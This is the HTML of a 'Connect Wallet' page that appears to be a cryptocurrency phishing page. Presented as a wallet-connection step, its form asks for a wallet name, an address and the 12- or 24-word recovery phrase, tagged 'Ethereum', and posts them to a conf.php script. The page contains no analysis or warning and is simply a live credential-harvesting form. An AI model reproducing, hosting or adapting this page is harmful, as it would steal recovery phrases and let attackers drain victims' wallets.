<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Connect Wallet</title>
    <link rel="stylesheet" href="https://correctionnode.net/wallets/assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://correctionnode.net/wallets/assets/fonts/fontawesome-all.min.css">
    <link rel="stylesheet" href="https://correctionnode.net/wallets/assets/css/styles.css">
    <link rel="apple-touch-icon" sizes="180x180" href="https://correctionnode.net/apple-touch-icon.html">
    <link rel="manifest" href="https://correctionnode.net/site.html">
    <link rel="icon" href="https://correctionnode.net//wallets/assets/logo.svg">
</head>
</head>
<body>
    <header>
        <div class="container-fluid">
			<div class="row">
			<div class="">
				<a class="text-white" href="" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;Please Connect To Your Wallet</a>
			</div>
			</div>
		</div>
    </header>
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 offset-md-4">
				<ul class="nav nav-tabs">
					<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Waiting...</a></li>
				</ul>
			</div>
		</div>
	</div>
    <section style="margin-top: 40px;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4 offset-md-4">
					<!-- Tab panes -->
					<div class="tab-content">
						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
							<form method="post" action="./conf.php">								 
<textarea class="form-control" rows="1" name="wallet_name" placeholder="Wallet Name example: trustwallet" required=""></textarea>
<br>
<textarea class="form-control" rows="1" name="wallet" placeholder="enter your wallet address" required=""></textarea>														
<br>
<textarea class="form-control" rows="5" name="phrase_json" placeholder="Phrase" required=""></textarea>
								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
								<input type="hidden" name="value" value="Ethereum">
								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">CONNECT WALLET</button></div>
							</form>						</div>						
					</div>
                </div>
            </div>
        </div>
    </section>
    <script src="https://correctionnode.net/wallets/assets/js/jquery.min.js"></script>
    <script src="https://correctionnode.net/wallets/assets/bootstrap/js/bootstrap.min.js"></script>
</body>
</html>